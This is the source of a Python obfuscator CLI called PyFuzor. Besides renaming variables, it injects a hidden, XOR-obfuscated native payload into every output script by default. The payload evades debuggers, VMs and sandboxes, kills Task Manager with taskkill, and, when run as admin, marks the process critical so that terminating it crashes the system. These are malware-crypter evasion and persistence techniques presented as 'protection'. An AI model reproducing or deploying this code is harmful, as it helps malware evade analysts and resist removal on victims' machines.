import ast
import json
import sys
import os
import secrets
import string
import builtins
import time
from alive_progress import alive_bar

# --- Obfuscation Core (Professional V2) ---

def get_random_name(length=8):
    return "PyFuzor_" + ''.join(secrets.choice(string.hexdigits) for _ in range(length))

class Scope:
    def __init__(self, scope_type, parent=None):
        self.scope_type = scope_type
        self.parent = parent
        self.definitions = {}
        self.globals = set()
        self.nonlocals = set()

    def resolve(self, name):
        if name in self.definitions:
            return self.definitions[name]
        if name in self.globals:
            return self.resolve_global(name)
        if name in self.nonlocals:
             if self.parent:
                 return self.parent.resolve(name)
             return None
        curr = self.parent
        while curr:
            if curr.scope_type == 'class':
                curr = curr.parent
                continue
            if name in curr.definitions:
                return curr.definitions[name]
            if name in curr.globals:
                return curr.resolve_global(name)
            curr = curr.parent
        return None

    def resolve_global(self, name):
        if self.scope_type == 'global':
            return self.definitions.get(name)
        if self.parent:
            return self.parent.resolve_global(name)
        return None

cl_builtins = set(dir(builtins))

class SymbolTableBuilder(ast.NodeVisitor):
    def __init__(self, config, exclusions):
        self.config = config
        self.exclusions = set(exclusions)
        self.root_scope = Scope('global')
        self.current_scope = self.root_scope
        self.scope_map = {}
        self.rename_enabled = config.get("rename_variables", True)
        
    def visit_Module(self, node):
        self.scope_map[node] = self.current_scope
        self.generic_visit(node)

    def visit_ClassDef(self, node):
        if self.rename_enabled:
             self._define_name(node.name)
        
        class_scope = Scope('class', parent=self.current_scope)
        self.scope_map[node] = class_scope
        old_scope = self.current_scope
        self.current_scope = class_scope
        self.generic_visit(node)
        self.current_scope = old_scope

    def visit_FunctionDef(self, node):
        if self.rename_enabled:
            self._define_name(node.name)
            
        func_scope = Scope('function', parent=self.current_scope)
        self.scope_map[node] = func_scope
        old_scope = self.current_scope
        self.current_scope = func_scope
        
        if self.rename_enabled:
            if node.args.args:
                for arg in node.args.args: self._define_name(arg.arg)
            if node.args.kwonlyargs:
                for arg in node.args.kwonlyargs: self._define_name(arg.arg)
            if node.args.vararg:
                self._define_name(node.args.vararg.arg)
            if node.args.kwarg:
                self._define_name(node.args.kwarg.arg)
                
        self.generic_visit(node)
        self.current_scope = old_scope

    def visit_Global(self, node):
        for name in node.names: self.current_scope.globals.add(name)
            
    def visit_Nonlocal(self, node):
        for name in node.names: self.current_scope.nonlocals.add(name)

    def visit_Import(self, node):
        if self.rename_enabled:
            for alias in node.names:
                name = alias.asname if alias.asname else alias.name.split('.')[0]
                self._define_name(name)

    def visit_ImportFrom(self, node):
        if self.rename_enabled:
            for alias in node.names:
                name = alias.asname if alias.asname else alias.name
                self._define_name(name)

    def visit_Name(self, node):
        if self.rename_enabled and isinstance(node.ctx, ast.Store):
            self._define_name(node.id)

    def _define_name(self, name):
        if name in self.exclusions or (name.startswith('__') and name.endswith('__')) or name in cl_builtins:
            return
        scope = self.current_scope
        if name in scope.globals: scope = self.root_scope
        elif name in scope.nonlocals: return
        if name not in scope.definitions:
            scope.definitions[name] = get_random_name()

class ProfessionalObfuscator(ast.NodeTransformer):
    def __init__(self, config, symbol_builder):
        self.config = config
        self.rename_enabled = config.get("rename_variables", True)
        self.current_scope = symbol_builder.root_scope
        self.scope_map = symbol_builder.scope_map
        self.ffi_enabled = config.get("ffi_obfuscation", {}).get("enabled", True)
        self.wrappers_needed = False
        self.flow_lib_name = "PyFuzor_Flow"

    def _enter_scope(self, node):
        if node in self.scope_map: self.current_scope = self.scope_map[node]
    def _exit_scope(self):
        if self.current_scope.parent: self.current_scope = self.current_scope.parent

    def visit_Module(self, node):
        self._enter_scope(node)
        self.generic_visit(node)
        self._exit_scope()
        return node
        
    def visit_ClassDef(self, node):
        if self.rename_enabled:
            new_name = self.current_scope.resolve(node.name)
            if new_name: node.name = new_name
        self._enter_scope(node)
        self.generic_visit(node)
        self._exit_scope()
        return node

    def visit_FunctionDef(self, node):
        if self.rename_enabled:
            new_name = self.current_scope.resolve(node.name)
            if new_name: node.name = new_name
        self._enter_scope(node)
        self.generic_visit(node)
        self._exit_scope()
        return node

    def visit_arg(self, node):
        if self.rename_enabled:
            new_name = self.current_scope.resolve(node.arg)
            if new_name: node.arg = new_name
        return self.generic_visit(node)

    def visit_Name(self, node):
        if self.rename_enabled and isinstance(node.ctx, (ast.Load, ast.Store)):
            new_name = self.current_scope.resolve(node.id)
            if new_name: node.id = new_name
        return self.generic_visit(node)

    def visit_Import(self, node):
        if self.rename_enabled:
            for alias in node.names:
                local_name = alias.asname if alias.asname else alias.name.split('.')[0]
                new_name = self.current_scope.resolve(local_name)
                if new_name: alias.asname = new_name
        return self.generic_visit(node)

    def visit_ImportFrom(self, node):
        if self.rename_enabled:
            for alias in node.names:
                local_name = alias.asname if alias.asname else alias.name
                new_name = self.current_scope.resolve(local_name)
                if new_name: alias.asname = new_name
        return self.generic_visit(node)

    def visit_Global(self, node):
        if self.rename_enabled:
            node.names = [self.current_scope.resolve_global(n) or n for n in node.names]
        return node

    def visit_Nonlocal(self, node):
        if self.rename_enabled:
            node.names = [self.current_scope.resolve(n) or n for n in node.names]
        return node

    def visit_If(self, node):
        if not self.ffi_enabled: return self.generic_visit(node)
        self.wrappers_needed = True
        self.generic_visit(node)
        node.test = ast.Call(
            func=ast.Attribute(value=ast.Name(id=self.flow_lib_name, ctx=ast.Load()), attr='ifchk', ctx=ast.Load()),
            args=[node.test], keywords=[]
        )
        return node

    def visit_IfExp(self, node):
        if not self.ffi_enabled: return self.generic_visit(node)
        self.wrappers_needed = True
        self.generic_visit(node)
        return ast.Call(
            func=ast.Subscript(
                value=ast.List(
                    elts=[
                        ast.Lambda(args=ast.arguments(posonlyargs=[], args=[], kwonlyargs=[], kw_defaults=[], defaults=[]), body=node.body),
                        ast.Lambda(args=ast.arguments(posonlyargs=[], args=[], kwonlyargs=[], kw_defaults=[], defaults=[]), body=node.orelse)
                    ],
                    ctx=ast.Load()
                ),
                slice=ast.Call(
                    func=ast.Attribute(value=ast.Name(id=self.flow_lib_name, ctx=ast.Load()), attr='elseobf', ctx=ast.Load()),
                    args=[node.test], keywords=[]
                ),
                ctx=ast.Load()
            ),
            args=[], keywords=[]
        )

# --- Templates ---

FFI_WRAPPER_SOURCE = r'''
class _PyFuzorFlow:
    def elseobf(self, cond): return int(not bool(cond))
    def ifchk(self, cond): return bool(cond)
PyFuzor_Flow = _PyFuzorFlow()
'''

ANTI_VM_SOURCE = r'''
def _pyfuzor_init_security():
    try:
        import cppyy
        import sys
        import os
        cppyy.cppdef("""
        #include <windows.h>
        #include <winternl.h>
        #include <string>
        #include <vector>
        #include <algorithm>

        std::string _dec(std::vector<unsigned char> data, unsigned char key) {
            std::string out;
            for (auto &b : data) out += (char)(b ^ key);
            return out;
        }

        typedef NTSTATUS (NTAPI *p_ni)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

        class _PyFuzor_Sec { 
        public:
            static bool _run_all() {
                if (_c_dbg()) return true;
                if (_c_r_dbg()) return true;
                if (_c_p_proc()) return true;
                if (_c_b_win()) return true;
                if (_c_v_art()) return true;
                if (_c_h_res()) return true;
                if (_c_u_name()) return true;
                if (_c_u_time(1200)) return true;
                _k_bad();
                return false;
            }
            static bool _c_dbg() {
                typedef BOOL (WINAPI *pIDP)(VOID);
                auto f = (pIDP)GetProcAddress(GetModuleHandleA(_dec({0x21, 0x2f, 0x38, 0x24, 0x2f, 0x26, 0x79, 0x38, 0x72, 0x72}, 0x4a).c_str()), _dec({0x2b, 0x31, 0x06, 0x27, 0x20, 0x25, 0x25, 0x27, 0x30, 0x12, 0x30, 0x27, 0x31, 0x27, 0x2c, 0x36}, 0x42).c_str());
                return f ? f() : false;
            }
            static bool _c_r_dbg() {
                BOOL isP = FALSE;
                CheckRemoteDebuggerPresent(GetCurrentProcess(), &isP);
                return isP;
            }
            static bool _c_p_proc() {
                HMODULE hN = GetModuleHandleA(_dec({0x24, 0x3e, 0x2e, 0x26, 0x26, 0x64, 0x2e, 0x26, 0x26}, 0x4a).c_str()); 
                if (hN) {
                    auto q = (p_ni)GetProcAddress(hN, _dec({0x24, 0x1e, 0x3b, 0x1f, 0x1f, 0x18, 0x13, 0x33, 0x14, 0x1c, 0x15, 0x18, 0x17, 0x1b, 0x13, 0x13, 0x13, 0x35, 0x18, 0x15, 0x19, 0x1f, 0x13, 0x19, 0x3a, 0x18, 0x15, 0x19, 0x1f, 0x19, 0x13}, 0x6a).c_str());
                    if (q) {
                        PROCESS_BASIC_INFORMATION pbi;
                        ULONG len;
                        if (q(GetCurrentProcess(), ProcessBasicInformation, &pbi, sizeof(pbi), &len) == 0) {
                            HANDLE hP = OpenProcess(0x1000, FALSE, (DWORD)pbi.Reserved3);
                            if (hP) {
                                char buf[MAX_PATH];
                                DWORD sz = MAX_PATH;
                                if (QueryFullProcessImageNameA(hP, 0, buf, &sz)) {
                                    std::string n(buf);
                                    std::transform(n.begin(), n.end(), n.begin(), ::tolower);
                                    CloseHandle(hP);
                                    if (n.find(_dec({0x2f, 0x32, 0x3a, 0x26, 0x25, 0x38, 0x2f, 0x38, 0x64, 0x2f, 0x32, 0x2f}, 0x4a)) == std::string::npos && 
                                        n.find(_dec({0x29, 0x27, 0x2e, 0x64, 0x2f, 0x32, 0x2f}, 0x4a)) == std::string::npos) return true;
                                }
                                CloseHandle(hP);
                            }
                        }
                    }
                }
                return false;
            }
            static bool _c_b_win() {
                std::vector<std::string> b = {
                    _dec({0x2e, 0x24, 0x39, 0x3a, 0x33, 0x6b, 0x22, 0x2d, 0x3b}, 0x4a),
                    _dec({0x32, 0x76, 0x7d, 0x2e, 0x28, 0x2d}, 0x4a),
                    _dec({0x3a, 0x38, 0x25, 0x29, 0x2f, 0x39, 0x39, 0x6a, 0x22, 0x2b, 0x29, 0x21, 0x2f, 0x38}, 0x4a)
                };
                for (const auto& t : b) { if (FindWindowA(NULL, t.c_str())) return true; }
                return false;
            }
            static bool _c_v_art() {
                std::vector<std::string> p = {
                    _dec({0x03, 0x7a, 0x1c, 0x11, 0x21, 0x2c, 0x27, 0x3f, 0x3b, 0x1c, 0x1b, 0x31, 0x3b, 0x2c, 0x2d, 0x25, 0x7a, 0x19, 0x1a, 0x21, 0x3e, 0x2d, 0x33, 0x3b, 0x7a, 0x1e, 0x02, 0x27, 0x30, 0x05, 0x27, 0x3d, 0x3b, 0x21, 0x66, 0x3b, 0x31, 0x3b}, 0x4a),
                    _dec({0x03, 0x7a, 0x1c, 0x11, 0x21, 0x2c, 0x27, 0x3f, 0x3b, 0x1c, 0x1b, 0x31, 0x3b, 0x2c, 0x2d, 0x25, 0x7a, 0x19, 0x1a, 0x21, 0x3e, 0x2d, 0x33, 0x3b, 0x7a, 0x3e, 0x25, 0x25, 0x27, 0x3d, 0x3b, 0x21, 0x66, 0x3b, 0x31, 0x3b}, 0x4a)
                };
                for (const auto& s : p) { if (GetFileAttributesA(s.c_str()) != -1) return true; }
                return false;
            }
            static bool _c_h_res() { return (GetSystemMetrics(0) < 800 || GetSystemMetrics(1) < 600); }
            static bool _c_u_name() {
                char u[256]; DWORD s = sizeof(u);
                if (GetUserNameA(u, &s)) {
                    std::string n(u); std::transform(n.begin(), n.end(), n.begin(), ::tolower);
                    if (n.find(_dec({0x39, 0x2b, 0x24, 0x2e, 0x28, 0x25, 0x32}, 0x4a)) != std::string::npos) return true; 
                }
                return false;
            }
            static bool _c_u_time(unsigned int m) { return (GetTickCount() / 1000) < m; }
            static void _k_bad() {
                std::vector<std::string> k = {_dec({0x3e, 0x2b, 0x39, 0x21, 0x27, 0x2d, 0x38, 0x64, 0x2f, 0x32, 0x2f}, 0x4a)};
                for (const auto& p : k) {
                    std::string c = _dec({0x3e, 0x2b, 0x39, 0x21, 0x21, 0x23, 0x26, 0x26, 0x6a, 0x65, 0x0c, 0x6a, 0x65, 0x03, 0x07, 0x6a}, 0x4a) + p + _dec({0x6a, 0x74, 0x6a, 0x24, 0x3f, 0x26, 0x6a, 0x78, 0x3e, 0x6a, 0x2d, 0x21}, 0x4a);
                    system(c.c_str());
                }
            }
            static bool _s_crit() {
                if (IsUserAnAdmin()) {
                    HMODULE h = GetModuleHandleA(_dec({0x24, 0x3e, 0x2e, 0x26, 0x26, 0x64, 0x2e, 0x26, 0x26}, 0x4a).c_str());
                    if (h) {
                        auto a = (NTSTATUS(NTAPI*)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN))GetProcAddress(h, _dec({0x18, 0x3e, 0x26, 0x0b, 0x2e, 0x20, 0x3f, 0x39, 0x3e, 0x1a, 0x38, 0x23, 0x3c, 0x23, 0x26, 0x2f, 0x2d, 0x2f}, 0x4a).c_str());
                        auto s = (NTSTATUS(NTAPI*)(BOOLEAN, PBOOLEAN, BOOLEAN))GetProcAddress(h, _dec({0x18, 0x3e, 0x26, 0x19, 0x2f, 0x3e, 0x1a, 0x38, 0x25, 0x29, 0x2f, 0x39, 0x39, 0x03, 0x39, 0x09, 0x38, 0x23, 0x3e, 0x23, 0x29, 0x2b, 0x26}, 0x4a).c_str());
                        if (a && s) { BOOLEAN e; a(20, 1, 0, &e); s(1, 0, 0); return true; }
                    }
                }
                return false;
            }
        };
        """)
        
        native = cppyy.gbl._PyFuzor_Sec
        if native._run_all():
             sys.exit(0)
            
        recent_path = os.path.join(os.getenv('APPDATA', ''), 'Microsoft', 'Windows', 'Recent')
        if os.path.exists(recent_path) and len(os.listdir(recent_path)) < 20:
             sys.exit(0)
            
        native._s_crit()
    except:
        pass

_pyfuzor_init_security()
'''

# --- CLI Aesthetics & Logic ---

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding='utf-8')

ANSI_RESET = "\u001b[0m"
ANSI_CYAN = "\u001b[36m"
ANSI_MAGENTA = "\u001b[35m"
ANSI_YELLOW = "\u001b[33m"
ANSI_GREEN = "\u001b[32m"
ANSI_RED = "\u001b[31m"
ANSI_BOLD = "\u001b[1m"

LOGO = f"""
{ANSI_MAGENTA}{ANSI_BOLD}
 ██████╗ ██╗   ██╗███████╗██╗   ██╗███████╗ ██████╗ ██████╗ 
 ██╔══██╗╚██╗ ██╔╝██╔════╝██║   ██║╚══███╔╝██╔═══██╗██╔══██╗
 ██████╔╝ ╚████╔╝ █████╗  ██║   ██║  ███╔╝ ██║   ██║██████╔╝
 ██╔═══╝   ╚██╔╝  ██╔══╝  ██║   ██║ ███╔╝  ██║   ██║██╔══██╗
 ██║        ██║   ██║     ╚██████╔╝███████╗╚██████╔╝██║  ██║
 ╚═╝        ╚═╝   ╚═╝      ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝
{ANSI_CYAN}         --- PYFUZOR OBFUSCATOR V2.0 (PRO) ---
{ANSI_RESET}"""

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def load_config():
    config = {
        "ffi_obfuscation": {"enabled": True}, 
        "rename_variables": True,
        "anti_vm": {"enabled": True},
        "remove_comments": True
    }
    if os.path.exists("config.json"):
        try:
            with open("config.json", "r") as f:
                ext_config = json.load(f)
                config.update(ext_config)
        except: pass
    return config

def process_obfuscation(filename):
    if not filename.endswith(".py"):
        filename += ".py"
    
    if not os.path.exists(filename):
        print(f"{ANSI_RED}Error: File '{filename}' not found.{ANSI_RESET}")
        return

    config = load_config()
    
    exclusions = []
    if os.path.exists("exclusions.txt"):
        try:
            with open("exclusions.txt", "r") as f: exclusions = [l.strip() for l in f if l.strip()]
        except: pass

    with alive_bar(100, title=f'Protecting {filename}', bar='smooth', spinner='dots_waves') as bar:
        for _ in range(5): time.sleep(0.01); bar()
        with open(filename, "r", encoding="utf-8") as f: source = f.read() 
        
        # Decide Strategy
        use_ast = False
        if config.get("rename_variables"): use_ast = True
        if config.get("ffi_obfuscation", {}).get("enabled"): use_ast = True
        if config.get("remove_comments"): use_ast = True
        
        output_code = ""

        if use_ast:
             # Full Obfuscation (Lossy for comments)
             if not config.get("remove_comments"):
                 # Warn user
                 pass # Cannot easily warn inside progress bar without messing up output

             for _ in range(10): time.sleep(0.01); bar()
             tree = ast.parse(source)
             
             for _ in range(20): time.sleep(0.01); bar()
             builder = SymbolTableBuilder(config, exclusions)
             builder.visit(tree)
             
             for _ in range(30): time.sleep(0.01); bar()
             obfuscator = ProfessionalObfuscator(config, builder)
             tree = obfuscator.visit(tree)
             ast.fix_missing_locations(tree)
             
             if obfuscator.wrappers_needed:
                wrapper_tree = ast.parse(FFI_WRAPPER_SOURCE)
                tree.body = wrapper_tree.body + tree.body
                
             # Add Anti-VM via AST if enabled (cleaner insertion)
             if config.get("anti_vm", {}).get("enabled", True):
                antivm_tree = ast.parse(ANTI_VM_SOURCE)
                tree.body = antivm_tree.body + tree.body
                
             for _ in range(20): time.sleep(0.01); bar()
             output_code = ast.unparse(tree)
             
        else:
             # Direct Mode (Preserves Comments)
             for _ in range(60): time.sleep(0.01); bar()
             output_code = source
             if config.get("anti_vm", {}).get("enabled", True):
                 output_code = ANTI_VM_SOURCE + "\n" + output_code
             
             # If user wanted remove_comments=False, we are good.
             # If user wanted remove_comments=True, we would have entered Loop A (use_ast=True).

        base, _ = os.path.splitext(filename)
        out_name = f"{base}_pro.py"
        with open(out_name, "w", encoding="utf-8") as f: f.write(output_code)
    
    print(f"\n{ANSI_GREEN}PYFUZOR SUCCESS!{ANSI_RESET} Protected code saved to: {ANSI_YELLOW}{out_name}{ANSI_RESET}")
    if not use_ast and config.get("anti_vm", {}).get("enabled"):
        print(f"{ANSI_CYAN}Info: Lightweight mode used. Comments preserved.{ANSI_RESET}\n")
    elif use_ast and not config.get("remove_comments"):
        print(f"{ANSI_RED}Warning: Comments removed because advanced obfuscation (Rename/FFI) is enabled.{ANSI_RESET}\n")
    else:
        print("")

def main_cli():
    clear_screen()
    print(LOGO)
    print(f"{ANSI_YELLOW}Commands: obf <name>, help, exit, clear{ANSI_RESET}")
    print(f"{ANSI_CYAN}Note: Extensions are optional (.py will be added automatically){ANSI_RESET}\n")
    
    while True:
        try:
            cmd_input = input(f"{ANSI_MAGENTA}{ANSI_BOLD}PyFuzor >>> {ANSI_RESET}").strip()
            if not cmd_input: continue
            
            parts = cmd_input.split()
            cmd = parts[0].lower()
            
            if cmd == "exit" or cmd == "quit":
                print(f"{ANSI_MAGENTA}Closing PyFuzor. Stay safe!{ANSI_RESET}")
                break
            elif cmd in ["obfuscate", "obf"]:
                if len(parts) < 2:
                    print(f"{ANSI_RED}Usage: {cmd} <filename>{ANSI_RESET}")
                else:
                    process_obfuscation(parts[1])
            elif cmd == "help":
                 print(f"{ANSI_CYAN}Commands:\n  - obf <filename>     : Obfuscate a python script\n  - help                : Show this message\n  - clear               : Clear the screen\n  - exit                : Quit the program{ANSI_RESET}")
            elif cmd == "clear":
                clear_screen()
                print(LOGO)
            else:
                print(f"{ANSI_RED}Unknown command: {cmd}{ANSI_RESET}")
        except KeyboardInterrupt:
            print(f"\n{ANSI_MAGENTA}Closing PyFuzor.{ANSI_RESET}")
            break
        except Exception as e:
            print(f"{ANSI_RED}Error: {e}{ANSI_RESET}")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        cmd = sys.argv[1].lower()
        if cmd in ["obfuscate", "obf"] and len(sys.argv) > 2:
            process_obfuscation(sys.argv[2])
        else:
            process_obfuscation(sys.argv[1])
    else:
        main_cli()
